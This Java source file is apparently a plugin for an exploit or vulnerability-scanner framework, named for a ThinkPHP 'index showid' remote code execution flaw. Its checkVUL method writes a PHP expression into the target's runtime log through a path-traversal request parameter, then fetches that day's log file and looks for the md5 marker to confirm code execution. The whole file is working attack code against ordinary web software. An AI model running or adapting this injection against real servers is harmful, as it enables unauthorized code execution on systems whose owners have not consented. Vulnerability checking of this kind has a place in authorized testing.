package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

import java.time.LocalDate;
import java.time.format.DateTimeFormatter;

public class thinkphp_index_showid_rce implements BasePayload {
    private static final String CheckStr="56540676a129760a3";

    public boolean checkVUL(String url) throws Exception{

        try {
            HttpTool.getHttpReuest(url + "/index.php?s=my-show-id-\\x5C..\\x5CTpl\\x5C8edy\\x5CHome\\x5Cmy_1{~var_dump(md5(2333))}]", "utf-8");
            /*
            获取当前时间
             */
            LocalDate date = LocalDate.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yy_MM_dd");

            String test_result= HttpTool.getHttpReuest(url + "/index.php?s=my-show-id-\\x5C..\\x5CRuntime\\x5CLogs\\x5C"+date.format(formatter)+".log'", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}
        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}